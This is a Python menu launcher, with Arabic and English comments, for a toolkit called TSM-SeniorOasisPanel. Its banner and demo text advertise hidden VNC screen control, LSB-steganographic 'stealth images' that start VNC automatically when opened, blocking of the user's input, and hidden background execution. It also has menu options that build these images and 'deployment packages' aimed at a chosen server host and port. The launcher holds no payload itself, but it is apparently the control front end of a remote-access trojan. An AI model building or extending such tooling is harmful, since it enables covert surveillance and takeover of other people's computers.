#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Master Launcher
المشغل الرئيسي لنظام TSM الكامل
"""

import os
import sys
import time
import subprocess
import threading
from PIL import Image, ImageDraw, ImageFont

class TSMMasterLauncher:
    """المشغل الرئيسي لـ TSM"""
    
    def __init__(self):
        self.version = "2.0.0"
        self.title = "TSM-SeniorOasisPanel Master System"
        self.running = True
        
    def show_banner(self):
        """عرض شعار النظام"""
        banner = f"""
╔══════════════════════════════════════════════════════════════╗
║                    TSM-SeniorOasisPanel                     ║
║                   Master Control System                     ║
║                        Version {self.version}                        ║
╚══════════════════════════════════════════════════════════════╝

🎯 نظام نقل الملفات المخفي مع VNC تلقائي
🎯 Hidden File Transfer System with Auto VNC

الميزات الرئيسية | Main Features:
• نقل ملفات آمن عبر TCP
• VNC مخفي للتحكم في الشاشة
• تشفير الصور مع LSB
• حجب إدخالات المستخدم
• تنفيذ مخفي في الخلفية

═══════════════════════════════════════════════════════════════
"""
        print(banner)
    
    def show_main_menu(self):
        """عرض القائمة الرئيسية"""
        menu = """
📋 القائمة الرئيسية | Main Menu:

1. 🖥️  تشغيل الخادم | Start Server
2. 👤 تشغيل العميل | Start Client  
3. 🖼️  إنشاء صورة مخفية | Create Stealth Image
4. 📦 إنشاء حزمة نشر | Create Deployment Package
5. 🔧 تشغيل VNC محسن | Start Enhanced VNC
6. 🧪 تشغيل الاختبارات | Run Tests
7. 📖 عرض الدليل | Show Guide
8. ❌ خروج | Exit

═══════════════════════════════════════════════════════════════
"""
        print(menu)
    
    def start_server(self):
        """تشغيل الخادم"""
        print("🚀 بدء تشغيل خادم TSM...")
        try:
            # تشغيل الخادم الأساسي
            server_process = subprocess.Popen([
                sys.executable, "TSM_SeniorOasisPanel_server.py"
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            print("✅ خادم TSM تم تشغيله بنجاح")
            print("📡 الخادم يعمل على المنفذ 5000")
            return server_process
        except Exception as e:
            print(f"❌ خطأ في تشغيل الخادم: {e}")
            return None
    
    def start_client(self):
        """تشغيل العميل"""
        print("👤 بدء تشغيل عميل TSM...")
        try:
            subprocess.run([sys.executable, "TSM_SeniorOasisPanel_client.py"])
            print("✅ تم تشغيل العميل")
        except Exception as e:
            print(f"❌ خطأ في تشغيل العميل: {e}")
    
    def create_stealth_image(self):
        """إنشاء صورة مخفية"""
        print("🖼️ إنشاء صورة مخفية...")
        
        # الحصول على مسار الصورة
        image_path = input("📁 أدخل مسار الصورة الأصلية: ").strip()
        if not os.path.exists(image_path):
            print("❌ الصورة غير موجودة")
            return
        
        # الحصول على إعدادات الخادم
        server_host = input("🌐 عنوان الخادم (افتراضي: localhost): ").strip() or "localhost"
        server_port = input("🔌 منفذ الخادم (افتراضي: 5001): ").strip() or "5001"
        
        try:
            # تشغيل إنشاء الصورة المخفية
            result = subprocess.run([
                sys.executable, "TSM_StealthMode.py", "create",
                image_path, server_host, server_port
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                print("✅ تم إنشاء الصورة المخفية بنجاح")
                print("📁 الملف: TSM_Stealth_Image.png")
            else:
                print(f"❌ خطأ في إنشاء الصورة: {result.stderr}")
        except Exception as e:
            print(f"❌ خطأ في إنشاء الصورة: {e}")
    
    def create_deployment_package(self):
        """إنشاء حزمة نشر"""
        print("📦 إنشاء حزمة نشر...")
        
        # الحصول على مسار الصورة
        image_path = input("📁 أدخل مسار الصورة الأصلية: ").strip()
        if not os.path.exists(image_path):
            print("❌ الصورة غير موجودة")
            return
        
        # الحصول على إعدادات الخادم
        server_host = input("🌐 عنوان الخادم (افتراضي: localhost): ").strip() or "localhost"
        server_port = input("🔌 منفذ الخادم (افتراضي: 5001): ").strip() or "5001"
        
        try:
            # تشغيل إنشاء حزمة النشر
            result = subprocess.run([
                sys.executable, "TSM_StealthMode.py", "package",
                image_path, server_host, server_port
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                print("✅ تم إنشاء حزمة النشر بنجاح")
                print("📁 المجلد: TSM_Stealth_Deployment")
            else:
                print(f"❌ خطأ في إنشاء الحزمة: {result.stderr}")
        except Exception as e:
            print(f"❌ خطأ في إنشاء الحزمة: {e}")
    
    def start_enhanced_vnc(self):
        """تشغيل VNC محسن"""
        print("🔧 بدء تشغيل VNC محسن...")
        
        mode = input("اختر الوضع (server/client): ").strip().lower()
        if mode not in ['server', 'client']:
            print("❌ وضع غير صحيح")
            return
        
        try:
            subprocess.run([sys.executable, "TSM_EnhancedVNC.py", mode])
            print("✅ تم تشغيل VNC المحسن")
        except Exception as e:
            print(f"❌ خطأ في تشغيل VNC: {e}")
    
    def run_tests(self):
        """تشغيل الاختبارات"""
        print("🧪 تشغيل اختبارات النظام...")
        try:
            result = subprocess.run([
                sys.executable, "TSM_SystemTest.py"
            ], capture_output=True, text=True)
            
            print("📊 نتائج الاختبارات:")
            print(result.stdout)
            
            if result.stderr:
                print("⚠️ تحذيرات:")
                print(result.stderr)
        except Exception as e:
            print(f"❌ خطأ في تشغيل الاختبارات: {e}")
    
    def show_guide(self):
        """عرض الدليل"""
        print("📖 فتح دليل الاستخدام...")
        try:
            if os.path.exists("TSM_Complete_Guide.md"):
                with open("TSM_Complete_Guide.md", 'r', encoding='utf-8') as f:
                    content = f.read()
                print(content)
            else:
                print("❌ ملف الدليل غير موجود")
        except Exception as e:
            print(f"❌ خطأ في فتح الدليل: {e}")
    
    def create_demo_image(self):
        """إنشاء صورة تجريبية"""
        print("🎨 إنشاء صورة تجريبية...")
        try:
            # إنشاء صورة تجريبية
            img = Image.new('RGB', (800, 600), color='lightblue')
            draw = ImageDraw.Draw(img)
            
            # إضافة نص
            try:
                font = ImageFont.truetype("arial.ttf", 24)
            except:
                font = ImageFont.load_default()
            
            draw.text((50, 50), "TSM-SeniorOasisPanel Demo", fill='darkblue', font=font)
            draw.text((50, 100), "This is a demo image for testing", fill='navy', font=font)
            draw.text((50, 150), "يمكن استخدام هذه الصورة للاختبار", fill='darkgreen', font=font)
            
            # حفظ الصورة
            demo_image = "TSM_Demo_Image.png"
            img.save(demo_image)
            print(f"✅ تم إنشاء الصورة التجريبية: {demo_image}")
            return demo_image
        except Exception as e:
            print(f"❌ خطأ في إنشاء الصورة التجريبية: {e}")
            return None
    
    def run_demo(self):
        """تشغيل عرض توضيحي"""
        print("🎬 بدء العرض التوضيحي...")
        
        # إنشاء صورة تجريبية
        demo_image = self.create_demo_image()
        if not demo_image:
            return
        
        print("📋 خطوات العرض التوضيحي:")
        print("1. إنشاء صورة مخفية مع VNC")
        print("2. تشغيل الخادم")
        print("3. تشغيل VNC المحسن")
        print("4. اختبار النظام")
        
        # إنشاء صورة مخفية
        print("\n🖼️ إنشاء صورة مخفية...")
        try:
            result = subprocess.run([
                sys.executable, "TSM_StealthMode.py", "create",
                demo_image, "localhost", "5001"
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                print("✅ تم إنشاء الصورة المخفية")
                print("📁 الملف: TSM_Stealth_Image.png")
                print("\n🎯 يمكنك الآن:")
                print("• فتح الصورة لبدء VNC تلقائياً")
                print("• تشغيل الخادم للتحكم في الشاشة")
                print("• استخدام VNC المحسن للتحكم الكامل")
            else:
                print(f"❌ خطأ في إنشاء الصورة المخفية: {result.stderr}")
        except Exception as e:
            print(f"❌ خطأ في العرض التوضيحي: {e}")
    
    def main_loop(self):
        """الحلقة الرئيسية"""
        self.show_banner()
        
        while self.running:
            self.show_main_menu()
            
            try:
                choice = input("🔢 اختر رقم (1-8): ").strip()
                
                if choice == '1':
                    self.start_server()
                elif choice == '2':
                    self.start_client()
                elif choice == '3':
                    self.create_stealth_image()
                elif choice == '4':
                    self.create_deployment_package()
                elif choice == '5':
                    self.start_enhanced_vnc()
                elif choice == '6':
                    self.run_tests()
                elif choice == '7':
                    self.show_guide()
                elif choice == '8':
                    print("👋 شكراً لاستخدام TSM-SeniorOasisPanel")
                    self.running = False
                elif choice == 'demo':
                    self.run_demo()
                else:
                    print("❌ اختيار غير صحيح")
                
                if self.running:
                    input("\n⏸️ اضغط Enter للمتابعة...")
                    print("\n" + "="*60 + "\n")
                    
            except KeyboardInterrupt:
                print("\n\n👋 تم إيقاف النظام")
                self.running = False
            except Exception as e:
                print(f"\n❌ خطأ: {e}")
                input("⏸️ اضغط Enter للمتابعة...")

def main():
    """الدالة الرئيسية"""
    launcher = TSMMasterLauncher()
    launcher.main_loop()

if __name__ == "__main__":
    main()
